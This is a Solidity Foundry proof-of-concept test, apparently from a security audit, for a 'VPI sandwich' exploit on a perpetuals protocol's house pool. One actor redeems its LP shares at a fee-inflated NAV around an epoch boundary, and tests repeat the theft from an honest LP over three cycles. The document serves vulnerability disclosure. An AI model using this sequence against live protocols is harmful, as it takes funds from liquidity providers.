/// from the pool (the lifetime clamp only stops the refund from exceeding what was paid). An LP that redeems between the
/// open and the close takes its share of the refundable VPI; the refund is then paid by the LPs that stayed.
///
/// One actor, three addresses: `atk` (Junior LP), `atkT` (trader), and the same actor calls the permissionless
/// `settleLpEpoch` as keeper. Timeline around one epoch boundary H:
///   H-10m  atk requests redemption of all its Junior shares (before the 5-minute cutoff, so it targets H)
///   H-60s  atkT opens a LONG up to 95 % of the remaining maxSkew room -> pays VPI into the pool
///   H+1s   atk settles epoch H through the Router -> redemption funded at the inflated NAV
///   H+2s   atkT closes -> VPI refunded from the pool, now owned only by the remaining LPs
/// The position is open for about one minute. Price is constant, so neither side has price PnL.
///
/// Release configuration (DEPLOYMENT.md "Initial release parameters" + release-only constructor wrappers of
/// script/DeployPerpsArbitrumSepolia.s.sol) is set through the normal admin path and asserted in `_release`.
/// Every trade goes through the public OrderRouter (commitOrder -> executeOrder by a keeper); only Pyth and USDG are mocked.
contract VpiLpSandwichPoC is HousePoolTestBase {

    address internal atk = address(0xA77); // attacker, Junior LP
    address internal atkT = address(0xA78); // attacker, trader (same actor, second address)
    address internal frank = address(0x666); // honest trader holding an existing LONG skew
    address internal keeper = address(0xBEEF); // honest keeper for ordinary execution

    uint256 internal constant VICTIM_LP = 2_000_000 * 1e6; // bob, honest Junior LP
    uint256 internal constant ATTACK_LP = 2_000_000 * 1e6; // attacker Junior capital (about half of the pool)
    uint256 internal constant TRADER_CASH = 100_000 * 1e6;

    uint256 internal hBoundary;
    uint256 internal rid;
    uint256 internal atkShares;
    uint256 internal size;
    uint256 internal depthAtQueue;

    // ---------------- release configuration ----------------

    function _release() internal {
        _setRiskParams(
            CfdTypes.RiskParams({
                vpiFactor: 0.01e18,
                maxSkewRatio: 0.4e18,
                maintMarginBps: 10,
                initMarginBps: 20,
                fadMarginBps: 300,
                baseCarryBps: 500,
                minBountyAssets: 1e6,
                bountyBps: 10,
                keeperShareBps: 5000,
                protocolShareBps: 0
            })
        );
        assertEq(engine.executionFeeBps(), 4, "release execution fee 0.04 %");
        IOrderRouterAdminHost.RouterConfig memory rc = _routerConfig();
        rc.minOpenNotionalAssets = 1000e6;
        rc.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(rc);
        _setSeniorCapacity(40_000_000e6, 8000);
        assertEq(router.minOpenNotionalAssets(), 1000e6);
        assertEq(router.pletherOracle().adverseConfidenceMultiplierBps(), 2500);
        assertEq(router.pletherOracle().basketMaxConfidenceRatioBps(), 10);
        assertEq(router.maxPendingOrders(), 5);
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6);
        assertEq(pool.maxSeniorShareBps(), 8000);
        assertEq(engine.frozenCloseSpreadBps(), 50);
        assertEq(engine.settlementBufferBps(), 25);
        assertEq(engine.fadRunwaySeconds(), 1 hours);
    }

    function _live() internal {
        while (engine.isOracleFrozen() || engine.isFadWindow()) {
            vm.warp(vm.getBlockTimestamp() + 1 hours);
        }
    }

    // ---------------- public-path helpers ----------------

    function _route(address a, uint256 sz, uint256 margin, bool isClose, address exec)
        internal
        returns (OrderV3Types.ExecutionResult memory r)
    {
        OrderV3Types.OrderRequest memory q;
        q.clientOrderId = keccak256(abi.encode("vpi-sandwich", router.nextCommitId()));
        q.side = CfdTypes.Side.LONG;
        q.sizeDelta = sz;
        q.marginDelta = margin;
        q.isClose = isClose;
        q.targetPrice = isClose ? type(uint256).max : 1;
        q.bounds.submitBy = uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds());
        q.bounds.executionWindowSeconds = uint32(router.maxExecutionWindowSeconds());
        q.bounds.allowedExecutionModes = 7;
        q.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        q.bounds.maxExecutionBountyAssets = type(uint256).max;
        q.bounds.maxExecutionNotionalAssets = type(uint256).max;
        q.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        q.bounds.maxActionChargeAssets = type(uint256).max;
        q.bounds.maxExplicitFeesAssets = type(uint256).max;
        q.bounds.maxPostPositionSize = type(uint256).max;
        q.bounds.maxPostLeverageBps = type(uint32).max;
        vm.prank(a);
        uint64 id = router.commitOrder(q);
        bytes[] memory upd = _mockPythUpdateData(1e8); // next block, first tick after the commit
        vm.prank(exec);
        r = router.executeOrder(id, upd);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executed");
    }

    /// Permissionless LP epoch settlement through the Router with a fresh tick, called by `who`.
    function _settle(address who) internal {
        bytes[] memory upd = _mockPythUpdateData(1e8);
        vm.prank(who);
        router.settleLpEpoch(upd);
    }

    function _size(address a) internal view returns (uint256 s) {
        (s,,,,,,) = engine.positions(a);
    }

    function _vpi(address a) internal view returns (int256 v) {
        (,,,,,, v) = engine.positions(a);
    }

    function _bobValue() internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(bob));
    }

    // ---------------- scenario ----------------

    /// Honest state: bob is the Junior LP, frank holds an existing LONG skew; the attacker's LP lot is active and past
    /// its cooldown, and its full redemption is queued for the next boundary H.
    function _setup() internal {
        _release();
        _fundJunior(bob, VICTIM_LP);
        _live();
        _fundTrader(frank, 100_000 * 1e6);
        vm.prank(address(router));
        engine.updateMarkPrice(1e8, uint64(vm.getBlockTimestamp()));
        _route(frank, 600_000 * 1e18, 30_000 * 1e6, false, keeper); // honest LONG skew of 600k
        _depositAsync(juniorVault, atk, ATTACK_LP);
        _finishAsyncCooldown(juniorVault, atk);
        _live();
        _fundTrader(atkT, TRADER_CASH);
        _queueExit();
    }

    function _queueExit() internal {
        hBoundary = (vm.getBlockTimestamp() / 1 hours + 1) * 1 hours;
        if (hBoundary < vm.getBlockTimestamp() + 15 minutes) hBoundary += 1 hours;
        vm.warp(hBoundary - 10 minutes);
        _live();
        require(vm.getBlockTimestamp() == hBoundary - 10 minutes, "boundary not live");
        atkShares = juniorVault.balanceOf(atk);
        rid = _requestAsyncRedeem(juniorVault, atk, atkShares);
        assertEq(pool.lpEpochStart(rid), hBoundary, "redemption targets boundary H");
        (, uint256 longOi,,) = engine.sides(0);
        (, uint256 shortOi,,) = engine.sides(1);
        uint256 depth = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        depthAtQueue = depth;
        uint256 skew = ((longOi - shortOi) * 1e8) / 1e20;
        uint256 room = ((depth * 4) / 10 - skew) * 95 / 100;
        size = (room * 1e20 / 1e8 / 1e20) * 1e20;
    }

    struct Outcome {
        uint256 lpOut;
        uint256 traderLeft;
        int256 pnl;
        uint256 bobValue;
        uint256 vpiPaid;
        uint256 navAfterOpen;
        uint256 navBefore;
    }

    function _cycle(bool attack) internal returns (Outcome memory o) {
        uint256 traderStart = clearinghouse.balanceAssets(atkT);
        (, o.navBefore) = pool.getPendingDepositTrancheState();
        if (attack) {
            vm.warp(hBoundary - 61);
            _route(atkT, size, size / 1e12 / 50, false, keeper); // margin 2 % of notional (price 1.00)
            assertLt(vm.getBlockTimestamp(), hBoundary, "open executes before H");
            o.vpiPaid = uint256(_vpi(atkT));
            (, o.navAfterOpen) = pool.getPendingDepositTrancheState();
        }
        vm.warp(hBoundary);
        _settle(atk); // attacker acts as the permissionless keeper at H+1
        uint256 claimable = juniorVault.claimableRedeemRequest(rid, atk);
        assertEq(claimable, atkShares, "redemption fully funded");
        uint256 w = settlementToken.balanceOf(atk);
        vm.prank(atk);
        juniorVault.claimRedeem(rid, claimable, atk, atk);
        o.lpOut = settlementToken.balanceOf(atk) - w;
        if (attack) {
            _route(atkT, size, 0, true, keeper); // close right after the exit
            assertEq(_size(atkT), 0, "closed");
        }
        o.traderLeft = clearinghouse.balanceAssets(atkT);
        o.pnl = int256(o.lpOut + o.traderLeft) - int256(ATTACK_LP + traderStart);
        o.bobValue = _bobValue();
    }

    // ---------------- tests ----------------

    function test_vpiSandwich_extractsFromRemainingLps() public {
        _setup();
        uint256 bobBefore = _bobValue(); // bob's Junior balance right before the cycle
        uint256 snap = vm.snapshotState();
        Outcome memory c = _cycle(false);
        vm.revertToState(snap);
        Outcome memory a = _cycle(true);

        console2.log("pool depth before open, attacker LP included (6 dec)", depthAtQueue);
        console2.log("LONG notional opened at H-60s (6 dec)", size / 1e12);
        console2.log("VPI paid on open (6 dec)", a.vpiPaid);
        console2.log("Junior NAV step on open (6 dec)", a.navAfterOpen - a.navBefore);
        console2.log("control: attacker LP out / pnl (6 dec)", c.lpOut);
        console2.logInt(c.pnl);
        console2.log("attack:  attacker LP out (6 dec)", a.lpOut);
        console2.log("attack:  attacker trader balance after close (6 dec)", a.traderLeft);
        console2.log("attack:  attacker pnl (6 dec)");
        console2.logInt(a.pnl);
        console2.log("bob (honest LP) value: control / attack (6 dec)", c.bobValue, a.bobValue);
        console2.log("bob loss vs control (6 dec)", c.bobValue - a.bobValue);
        console2.log("bob value before the cycle / after control / after attack (6 dec)", bobBefore, c.bobValue, a.bobValue);
        console2.log("bob balance lost to the attack, vs before the cycle (6 dec)", bobBefore - a.bobValue);

        // the VPI paid on open is priced into Junior NAV at once (difference is rounding only)
        assertApproxEqAbs(a.navAfterOpen - a.navBefore, a.vpiPaid, 10_000, "NAV step on open equals the VPI paid");
        // the trader leg gets its VPI back: it loses only the two execution fees (0.04 % each)
        uint256 fees = (2 * size / 1e12 * 4) / 10_000;
        assertApproxEqAbs(TRADER_CASH - a.traderLeft, fees, fees / 20, "trader leg pays only execution fees");
        // the LP leg is paid its share of the refundable VPI
        assertGt(a.lpOut, c.lpOut, "attacker LP exits above the control");
        // net profit for the attacker, paid by the LP that stayed
        assertGt(a.pnl, 0, "attacker nets a profit");
        assertGt(a.pnl, c.pnl, "profit comes from the sequence, not from LP carry");
        assertLt(a.bobValue, c.bobValue, "honest LP loses versus the control");
        assertGe(c.bobValue - a.bobValue, uint256(a.pnl), "honest LP loss covers the attacker profit");
        // the loss is taken from the balance bob already held: without the attack his balance does not change over the
        // window, with the attack it ends below its value before the cycle
        assertApproxEqAbs(c.bobValue, bobBefore, 1e6, "without the attack bob's balance is unchanged over the window");
        assertLt(a.bobValue, bobBefore, "honest LP ends below the balance it held before the attack");
        assertGe(bobBefore - a.bobValue, uint256(a.pnl), "attacker profit is taken from that balance");
    }

    /// Repeats the cycle: after each exit the attacker re-deposits, waits activation + cooldown, and attacks the next
    /// boundary. Each cycle takes about three hours of wall time.
    function test_vpiSandwich_repeats() public {
        _setup();
        uint256 bobStart = _bobValue();
        int256 total;
        uint256 t0 = vm.getBlockTimestamp();
        for (uint256 i; i < 3; ++i) {
            Outcome memory a = _cycle(true);
            total += a.pnl;
            console2.log("cycle / attacker pnl (6 dec) / bob value", i, uint256(a.pnl), a.bobValue);
            assertGt(a.pnl, 0, "every cycle is profitable");
            // re-enter with the original capital (profit kept aside) and queue the next exit
            _depositAsync(juniorVault, atk, ATTACK_LP);
            _finishAsyncCooldown(juniorVault, atk);
            _live();
            _queueExit();
        }
        console2.log("hours elapsed", (vm.getBlockTimestamp() - t0) / 1 hours);
        console2.log("attacker cumulative pnl (6 dec)");
        console2.logInt(total);
        console2.log("bob value start / end (6 dec)", bobStart, _bobValue());
        assertLt(_bobValue(), bobStart, "honest LP value falls with every cycle");
        console2.log("bob deposit / value after three cycles (6 dec)", VICTIM_LP, _bobValue());
        assertLt(_bobValue(), VICTIM_LP, "after three cycles the honest LP holds less than it deposited");
    }
}
```

